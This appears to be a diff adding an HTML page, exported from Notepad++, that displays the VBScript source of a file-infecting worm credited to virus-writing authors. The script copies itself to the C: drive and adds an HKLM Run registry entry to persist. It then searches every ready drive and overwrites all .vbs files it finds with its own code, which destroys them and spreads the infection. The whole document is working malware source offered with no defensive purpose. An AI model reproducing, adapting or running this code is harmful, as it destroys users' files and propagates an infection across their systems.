@@ -1,0 +1,61 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Fso</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Drives</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Drive</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Folder</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Files</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">File</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc6">,</span><span class="sc7">Subfolder</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Fso</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">w.Copy</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\acookie.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">vrc2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc0"> </span><span class="sc4">"WScript.Shell"</span><span class="sc0"> </span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vrc2.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"VxBioLabs"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\acookie.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Drives</span><span class="sc6">=</span><span class="sc7">fso.drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Drive</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">Drives</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">drive.isready</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">Dosearch</span><span class="sc0"> </span><span class="sc7">drive</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0"> 
+</span><span class="sc3">Next</span><span class="sc0"> 
+</span><span class="sc1">'coded by ACIdCooKie / www.vxbiolabs.cjb.net
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Dosearch</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Folder</span><span class="sc6">=</span><span class="sc7">fso.getfolder</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">)</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Files</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">folder.files</span><span class="sc0"> 
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">File</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc0"> 
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">file.path</span><span class="sc6">)=</span><span class="sc4">"vbs"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> 
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">file.path</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0"> 
+</span><span class="sc3">Next</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">folder.SubFolders</span><span class="sc0"> 
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Subfolder</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc0"> 
+</span><span class="sc7">Dosearch</span><span class="sc0"> </span><span class="sc7">Subfolder.path</span><span class="sc0"> 
+</span><span class="sc3">Next</span><span class="sc0"> 
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">
+</span><span class="sc1">'Worm name is: EMM
+'Author of this worm is: PetiK
+</span></div></body>
+</html>
